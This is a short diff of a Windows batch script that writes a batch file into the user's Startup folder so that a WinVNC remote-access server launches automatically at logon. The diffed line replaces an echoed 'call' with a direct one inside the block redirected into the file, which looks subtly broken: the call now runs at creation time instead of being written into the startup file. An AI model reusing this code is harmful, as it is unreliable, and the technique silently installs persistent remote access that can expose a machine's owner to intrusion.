@@ -8,7 +8,7 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
   echo @echo off
   echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
   echo cd /d "%~dp0"
-  echo call "%~dp0run_winvnc.bat"
+  call "C:\Client-Load-main\run_winvnc.bat"
 ) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"
 
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
